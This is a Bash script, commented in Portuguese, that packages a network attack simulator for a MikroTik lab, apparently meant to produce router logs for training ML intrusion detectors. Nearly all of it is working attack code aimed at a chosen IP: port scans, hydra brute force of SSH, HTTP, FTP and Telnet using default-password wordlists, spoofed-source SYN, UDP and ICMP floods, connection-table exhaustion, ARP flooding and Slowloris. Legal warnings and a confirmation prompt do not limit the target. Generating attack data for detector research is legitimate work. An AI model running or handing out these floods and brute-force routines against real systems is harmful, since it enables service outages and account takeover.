#!/usr/bin/env bash
# =============================================================================
# Simulador de Ataques de Rede para Lab — MikroTik
# =============================================================================
# ATENÇÃO: Use APENAS em ambiente controlado, contra equipamentos SEUS.
#          O uso contra redes/equipamentos de terceiros é CRIME (Art. 154-A CP).
#
# Objetivo: Gerar tráfego malicioso real para coleta de logs autênticos
#           no MikroTik, visando análise com algoritmos de ML.
#
# Pré-requisitos:
#   sudo apt update && sudo apt install -y nmap hping3 hydra nikto \
#        ncrack curl net-tools iputils-ping dnsutils netcat-openbsd
#
# Uso:
#   chmod +x attack_simulator.sh
#   sudo ./attack_simulator.sh --target 192.168.1.1 --all
#   sudo ./attack_simulator.sh --target 192.168.1.1 --attack port-scan
#   sudo ./attack_simulator.sh --target 192.168.1.1 --attack brute-force
#   sudo ./attack_simulator.sh --target 192.168.1.1 --duration 300
# =============================================================================

set -euo pipefail

# ========================= CONFIGURAÇÃO =========================

TARGET=""
DURATION=120          # duração padrão de cada ataque (segundos)
ATTACK_TYPE="all"
LOG_FILE="attack_log_$(date +%Y%m%d_%H%M%S).log"
INTERFACE=""          # auto-detect se vazio

# Cores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

# ========================= FUNÇÕES AUXILIARES =========================

log_msg() {
    local level="$1"; shift
    local msg="$*"
    local ts
    ts=$(date '+%Y-%m-%d %H:%M:%S')
    echo -e "${ts} [${level}] ${msg}" | tee -a "$LOG_FILE"
}

info()    { log_msg "${GREEN}INFO${NC}" "$*"; }
warn()    { log_msg "${YELLOW}WARN${NC}" "$*"; }
attack()  { log_msg "${RED}ATTACK${NC}" "$*"; }
section() { echo -e "\n${CYAN}═══════════════════════════════════════════${NC}" | tee -a "$LOG_FILE"
            echo -e "${CYAN}  $*${NC}" | tee -a "$LOG_FILE"
            echo -e "${CYAN}═══════════════════════════════════════════${NC}\n" | tee -a "$LOG_FILE"; }

check_tool() {
    if ! command -v "$1" &>/dev/null; then
        warn "Ferramenta '$1' não encontrada. Instale com: sudo apt install $1"
        return 1
    fi
    return 0
}

check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}Este script precisa de sudo/root para hping3 e raw sockets.${NC}"
        echo "Execute: sudo $0 $*"
        exit 1
    fi
}

# ========================= ATAQUES =========================

# ---------------------------------------------------------------
# 1. PORT SCAN — Gera logs de firewall (drop em múltiplas portas)
# ---------------------------------------------------------------
attack_port_scan() {
    section "1. PORT SCAN (nmap)"
    if ! check_tool nmap; then return; fi

    attack "Iniciando SYN scan em todas as portas..."
    # SYN scan completo — gera muitos drops no firewall
    nmap -sS -p- --min-rate 1000 --max-retries 1 \
         -T4 "$TARGET" -oN "${LOG_FILE%.log}_nmap_syn.txt" 2>&1 | tee -a "$LOG_FILE" &
    local pid=$!

    sleep 5

    attack "Iniciando UDP scan nas portas comuns..."
    nmap -sU --top-ports 100 --min-rate 500 \
         "$TARGET" -oN "${LOG_FILE%.log}_nmap_udp.txt" 2>&1 | tee -a "$LOG_FILE" &

    sleep 5

    attack "Scan de versões e OS fingerprint..."
    nmap -sV -O --osscan-guess -p 22,23,53,80,443,8291,8728,8729 \
         "$TARGET" -oN "${LOG_FILE%.log}_nmap_version.txt" 2>&1 | tee -a "$LOG_FILE" &

    sleep 5

    attack "Xmas scan (flags FIN+PSH+URG)..."
    nmap -sX -p 1-1024 "$TARGET" 2>&1 | tee -a "$LOG_FILE" &

    attack "NULL scan (sem flags)..."
    nmap -sN -p 1-1024 "$TARGET" 2>&1 | tee -a "$LOG_FILE" &

    wait
    info "Port scan completo."
}

# ---------------------------------------------------------------
# 2. BRUTE FORCE — Gera logs de auth failure
# ---------------------------------------------------------------
attack_brute_force() {
    section "2. BRUTE FORCE (hydra)"
    if ! check_tool hydra; then return; fi

    # Cria wordlists temporárias
    local userlist="/tmp/mikrotik_users.txt"
    local passlist="/tmp/mikrotik_pass.txt"

    cat > "$userlist" << 'EOF'
admin
root
operator
monitor
guest
backup
user
mikrotik
manager
support
test
api-user
readonly
EOF

    cat > "$passlist" << 'EOF'
admin
password
123456
12345678
mikrotik
router
1234
qwerty
abc123
password1
letmein
welcome
monkey
master
changeme
default
admin123
root123
test123
P@ssw0rd
EOF

    attack "Brute force SSH (porta 22)..."
    hydra -L "$userlist" -P "$passlist" \
          -t 4 -w 5 -f -V \
          "$TARGET" ssh 2>&1 | tee -a "$LOG_FILE" || true &

    sleep 3

    attack "Brute force Winbox API (porta 8291)..."
    # Winbox usa protocolo proprietário, simulamos com conexões TCP
    for user in admin root operator guest; do
        for pass in admin 123456 password mikrotik; do
            echo -n "" | timeout 2 nc -w 1 "$TARGET" 8291 2>/dev/null || true
        done
    done &

    sleep 3

    attack "Brute force HTTP WebFig (porta 80)..."
    hydra -L "$userlist" -P "$passlist" \
          -t 4 -w 5 -f -V \
          "$TARGET" http-get / 2>&1 | tee -a "$LOG_FILE" || true &

    sleep 3

    attack "Brute force FTP (porta 21)..."
    hydra -L "$userlist" -P "$passlist" \
          -t 4 -w 5 -f -V \
          "$TARGET" ftp 2>&1 | tee -a "$LOG_FILE" || true &

    sleep 3

    attack "Brute force Telnet (porta 23)..."
    hydra -L "$userlist" -P "$passlist" \
          -t 4 -w 5 -f -V \
          "$TARGET" telnet 2>&1 | tee -a "$LOG_FILE" || true &

    wait
    rm -f "$userlist" "$passlist"
    info "Brute force completo."
}

# ---------------------------------------------------------------
# 3. SYN FLOOD — Gera logs de firewall (connection limit, drop)
# ---------------------------------------------------------------
attack_syn_flood() {
    section "3. SYN FLOOD (hping3)"
    if ! check_tool hping3; then return; fi

    local ports=(80 443 8080 8291 22 53)

    for port in "${ports[@]}"; do
        attack "SYN flood na porta $port por ${DURATION}s..."
        timeout "$DURATION" hping3 -S -p "$port" --flood \
                --rand-source "$TARGET" 2>&1 | tee -a "$LOG_FILE" &
        sleep 2
    done

    wait
    info "SYN flood completo."
}

# ---------------------------------------------------------------
# 4. UDP FLOOD — Gera logs de firewall (UDP drops)
# ---------------------------------------------------------------
attack_udp_flood() {
    section "4. UDP FLOOD (hping3)"
    if ! check_tool hping3; then return; fi

    attack "UDP flood porta 53 (DNS) por ${DURATION}s..."
    timeout "$DURATION" hping3 --udp -p 53 --flood \
            --rand-source "$TARGET" 2>&1 | tee -a "$LOG_FILE" &

    sleep 2

    attack "UDP flood porta 161 (SNMP) por ${DURATION}s..."
    timeout "$DURATION" hping3 --udp -p 161 --flood \
            --rand-source "$TARGET" 2>&1 | tee -a "$LOG_FILE" &

    sleep 2

    attack "UDP flood portas aleatórias por ${DURATION}s..."
    timeout "$DURATION" hping3 --udp --rand-dest -p ++0 --flood \
            "$TARGET" 2>&1 | tee -a "$LOG_FILE" &

    wait
    info "UDP flood completo."
}

# ---------------------------------------------------------------
# 5. ICMP FLOOD (Ping of Death) — Gera logs de ICMP drop
# ---------------------------------------------------------------
attack_icmp_flood() {
    section "5. ICMP FLOOD (hping3 + ping)"
    if ! check_tool hping3; then return; fi

    attack "ICMP flood por ${DURATION}s..."
    timeout "$DURATION" hping3 --icmp --flood \
            --rand-source "$TARGET" 2>&1 | tee -a "$LOG_FILE" &

    sleep 2

    attack "Ping com pacotes grandes (fragmentation)..."
    timeout "$DURATION" ping -f -s 65500 "$TARGET" 2>&1 | tee -a "$LOG_FILE" &

    wait
    info "ICMP flood completo."
}

# ---------------------------------------------------------------
# 6. DNS AMPLIFICATION SIMULATION
# ---------------------------------------------------------------
attack_dns_amplification() {
    section "6. DNS QUERIES MASSIVAS"
    if ! check_tool dig; then return; fi

    local domains=(
        "google.com" "facebook.com" "youtube.com" "amazon.com"
        "netflix.com" "twitter.com" "linkedin.com" "github.com"
        "evil-test.xyz" "malware-c2.test" "phishing-bank.test"
    )
    local qtypes=("A" "AAAA" "MX" "TXT" "ANY" "NS" "SOA" "CNAME")

    attack "Flood de queries DNS por ${DURATION}s..."
    local end_time=$((SECONDS + DURATION))
    local count=0

    while [[ $SECONDS -lt $end_time ]]; do
        local domain="${domains[$RANDOM % ${#domains[@]}]}"
        local qtype="${qtypes[$RANDOM % ${#qtypes[@]}]}"

        dig @"$TARGET" "$domain" "$qtype" +short +time=1 +tries=1 &>/dev/null &

        count=$((count + 1))

        # ~50 queries/segundo
        if (( count % 50 == 0 )); then
            sleep 1
            info "  Queries enviadas: $count"
        fi
    done

    wait
    info "DNS amplification sim completo. Total: $count queries"
}

# ---------------------------------------------------------------
# 7. CONEXÕES MASSIVAS (connection table exhaustion)
# ---------------------------------------------------------------
attack_connection_flood() {
    section "7. CONNECTION FLOOD (nc/bash)"

    attack "Abrindo conexões massivas por ${DURATION}s..."
    local end_time=$((SECONDS + DURATION))
    local count=0
    local ports=(80 443 8080 8291 22 21 23 53 8728)

    while [[ $SECONDS -lt $end_time ]]; do
        local port="${ports[$RANDOM % ${#ports[@]}]}"
        timeout 3 bash -c "echo '' > /dev/tcp/$TARGET/$port" 2>/dev/null &

        count=$((count + 1))

        # Limita processos paralelos
        if (( count % 100 == 0 )); then
            wait
            info "  Conexões tentadas: $count"
        fi
    done

    wait
    info "Connection flood completo. Total: $count conexões tentadas"
}

# ---------------------------------------------------------------
# 8. ARP SPOOFING SIMULATION
# ---------------------------------------------------------------
attack_arp_spoof() {
    section "8. ARP SPOOFING (arping)"

    if ! check_tool arping; then
        warn "arping não encontrado. Tentando com hping3..."
        if check_tool hping3; then
            attack "Enviando ARP requests falsos..."
            # Envia gratuitous ARPs fingindo ser o gateway
            local iface="${INTERFACE:-$(ip route | grep default | awk '{print $5}' | head -1)}"
            timeout "$DURATION" hping3 --arp -a "$TARGET" \
                    -I "$iface" --flood 2>&1 | tee -a "$LOG_FILE" &
            wait
        fi
        return
    fi

    local iface="${INTERFACE:-$(ip route | grep default | awk '{print $5}' | head -1)}"
    attack "Enviando ARP requests para $TARGET via $iface..."
    timeout "$DURATION" arping -I "$iface" -c 1000 -w "$DURATION" \
            "$TARGET" 2>&1 | tee -a "$LOG_FILE" &

    wait
    info "ARP spoof sim completo."
}

# ---------------------------------------------------------------
# 9. SLOWLORIS (HTTP slow connection)
# ---------------------------------------------------------------
attack_slowloris() {
    section "9. SLOWLORIS (conexões HTTP lentas)"

    attack "Iniciando Slowloris por ${DURATION}s..."
    local end_time=$((SECONDS + DURATION))
    local count=0

    while [[ $SECONDS -lt $end_time ]]; do
        # Abre conexão HTTP e envia headers lentamente
        {
            exec 3<>/dev/tcp/"$TARGET"/80 2>/dev/null || exit 0
            echo -e "GET / HTTP/1.1\r" >&3
            echo -e "Host: $TARGET\r" >&3
            echo -e "User-Agent: Mozilla/5.0\r" >&3
            # Envia headers incompletos lentamente
            for i in $(seq 1 30); do
                echo -e "X-Header-$i: keep-alive-$RANDOM\r" >&3
                sleep 2
            done
            exec 3>&-
        } &

        count=$((count + 1))

        if (( count % 20 == 0 )); then
            info "  Conexões Slowloris ativas: ~$count"
            sleep 1
        fi
    done

    wait
    info "Slowloris completo. Total: $count conexões"
}

# ---------------------------------------------------------------
# 10. TRÁFEGO NORMAL (para balancear o dataset)
# ---------------------------------------------------------------
generate_normal_traffic() {
    section "10. TRÁFEGO NORMAL (baseline)"

    attack "Gerando tráfego legítimo por ${DURATION}s..."
    local end_time=$((SECONDS + DURATION))
    local count=0

    while [[ $SECONDS -lt $end_time ]]; do
        # HTTP requests normais
        curl -s -o /dev/null -m 3 "http://$TARGET/" 2>/dev/null &

        # DNS queries normais
        dig @"$TARGET" google.com A +short +time=1 +tries=1 &>/dev/null &
        dig @"$TARGET" facebook.com AAAA +short +time=1 +tries=1 &>/dev/null &

        # Ping normal
        ping -c 1 -W 1 "$TARGET" &>/dev/null &

        count=$((count + 4))
        sleep 2
        
        if (( count % 40 == 0 )); then
            info "  Requests normais: $count"
        fi
    done

    wait
    info "Tráfego normal completo. Total: $count requests"
}


# ========================= ORQUESTRADOR =========================

run_all_attacks() {
    section "EXECUTANDO TODOS OS ATAQUES"
    info "Target: $TARGET"
    info "Duração por ataque: ${DURATION}s"
    info "Log: $LOG_FILE"
    echo ""

    # Primeiro gera tráfego normal (baseline)
    generate_normal_traffic

    sleep 5

    # Depois executa cada ataque com pausa entre eles
    attack_port_scan
    sleep 10

    attack_brute_force
    sleep 10

    attack_syn_flood
    sleep 10

    attack_udp_flood
    sleep 10

    attack_icmp_flood
    sleep 10

    attack_dns_amplification
    sleep 10

    attack_connection_flood
    sleep 10

    attack_arp_spoof
    sleep 10

    attack_slowloris
    sleep 10

    # Finaliza com mais tráfego normal
    generate_normal_traffic

    section "SIMULAÇÃO COMPLETA"
    info "Todos os ataques foram executados."
    info "Log salvo em: $LOG_FILE"
    info ""
    info "Próximos passos:"
    info "  1. Colete os logs do MikroTik: /log print"
    info "  2. Ou exporte via syslog/API para o Loki"
    info "  3. Use o dataset para treinar seus modelos de ML"
}

run_single_attack() {
    case "$ATTACK_TYPE" in
        port-scan)           attack_port_scan ;;
        brute-force)         attack_brute_force ;;
        syn-flood)           attack_syn_flood ;;
        udp-flood)           attack_udp_flood ;;
        icmp-flood)          attack_icmp_flood ;;
        dns-amplification)   attack_dns_amplification ;;
        connection-flood)    attack_connection_flood ;;
        arp-spoof)           attack_arp_spoof ;;
        slowloris)           attack_slowloris ;;
        normal)              generate_normal_traffic ;;
        all)                 run_all_attacks ;;
        *)
            echo -e "${RED}Ataque desconhecido: $ATTACK_TYPE${NC}"
            echo "Opções: port-scan, brute-force, syn-flood, udp-flood,"
            echo "        icmp-flood, dns-amplification, connection-flood,"
            echo "        arp-spoof, slowloris, normal, all"
            exit 1
            ;;
    esac
}

# ========================= CLI =========================

usage() {
    cat << 'EOF'
╔══════════════════════════════════════════════════════════════╗
║   Simulador de Ataques de Rede — Lab MikroTik / TCC        ║
║   ⚠  USE APENAS EM AMBIENTE CONTROLADO / SEUS EQUIPAMENTOS ║
╚══════════════════════════════════════════════════════════════╝

Uso: sudo ./attack_simulator.sh [opções]

Opções:
  --target, -t IP        IP do MikroTik alvo (obrigatório)
  --attack, -a TIPO      Tipo de ataque (padrão: all)
  --duration, -d SEG     Duração de cada ataque em segundos (padrão: 120)
  --interface, -i IFACE  Interface de rede a usar (auto-detect)
  --help, -h             Mostra esta ajuda

Ataques disponíveis:
  port-scan          Varredura de portas (nmap SYN/UDP/Xmas/NULL)
  brute-force        Força bruta SSH/HTTP/FTP/Telnet (hydra)
  syn-flood          Inundação SYN em múltiplas portas (hping3)
  udp-flood          Inundação UDP (DNS, SNMP, aleatório)
  icmp-flood         Inundação ICMP / Ping of Death
  dns-amplification  Queries DNS massivas
  connection-flood   Exaustão da tabela de conexões
  arp-spoof          Simulação de ARP spoofing
  slowloris          Conexões HTTP lentas
  normal             Apenas tráfego legítimo (baseline)
  all                Executa todos em sequência

Exemplos:
  sudo ./attack_simulator.sh -t 192.168.1.1 --all
  sudo ./attack_simulator.sh -t 192.168.1.1 -a port-scan
  sudo ./attack_simulator.sh -t 192.168.1.1 -a syn-flood -d 60
  sudo ./attack_simulator.sh -t 192.168.1.1 -a brute-force

Pré-requisitos:
  sudo apt install -y nmap hping3 hydra dnsutils netcat-openbsd iputils-ping curl arping
EOF
}

# Parse argumentos
while [[ $# -gt 0 ]]; do
    case "$1" in
        --target|-t)    TARGET="$2"; shift 2 ;;
        --attack|-a)    ATTACK_TYPE="$2"; shift 2 ;;
        --duration|-d)  DURATION="$2"; shift 2 ;;
        --interface|-i) INTERFACE="$2"; shift 2 ;;
        --help|-h)      usage; exit 0 ;;
        *)              echo "Opção desconhecida: $1"; usage; exit 1 ;;
    esac
done

# Validações
if [[ -z "$TARGET" ]]; then
    echo -e "${RED}Erro: --target é obrigatório${NC}"
    usage
    exit 1
fi

check_root "$@"

# Confirmação de segurança
echo -e "${YELLOW}"
echo "╔═══════════════════════════════════════════════════════════╗"
echo "║  ⚠  ATENÇÃO: Este script gera tráfego de ataque real.   ║"
echo "║  Use SOMENTE contra equipamentos SEUS em ambiente lab.   ║"
echo "║  O uso indevido é CRIME (Art. 154-A do Código Penal).   ║"
echo "╠═══════════════════════════════════════════════════════════╣"
echo "║  Target:   $TARGET"
echo "║  Ataque:   $ATTACK_TYPE"
echo "║  Duração:  ${DURATION}s por ataque"
echo "╚═══════════════════════════════════════════════════════════╝"
echo -e "${NC}"
read -rp "Confirma que o alvo é SEU equipamento em ambiente lab? (sim/não): " confirm
if [[ "$confirm" != "sim" ]]; then
    echo "Abortado."
    exit 0
fi

# Executa
info "Iniciando simulação..."
run_single_attack

info "Fim da simulação. Log: $LOG_FILE"
